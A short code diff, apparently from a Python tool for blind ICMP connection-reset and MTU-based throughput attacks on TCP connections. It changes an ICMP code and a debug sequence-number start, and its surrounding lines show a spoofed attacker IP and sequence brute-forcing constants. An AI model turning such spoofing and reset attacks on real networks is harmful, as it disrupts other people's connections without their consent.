@@ -11,7 +11,7 @@ ATTACKER_IP = "192.168.1.1"   # Spoofed router IP for throughput attack
 SERVER_PORT = 8080
 NEXT_HOP_MTU = 512
 MAX_SEQ = 4294967295          # Full 32-bit sequence number range
-icmp_reset_code = 2
+icmp_reset_code = 1
 
 def get_port_scan_strategy():
     """Return port scanning strategy for blind attack"""
@@ -124,7 +124,7 @@ def build_embedded_headers(client_ip, server_ip, client_port, server_port, seq):
 
 # Add hardcoded debug values for port and sequence
 DEBUG_CLIENT_PORT = 55555
-DEBUG_SEQ_START = 123456789
+DEBUG_SEQ_START = 1234567
 DEBUG_SEQ_RANGE = MAX_SEQ - DEBUG_SEQ_START  # Number of sequence numbers to try
 
 def icmp_connection_reset(sock, strategy="random"):
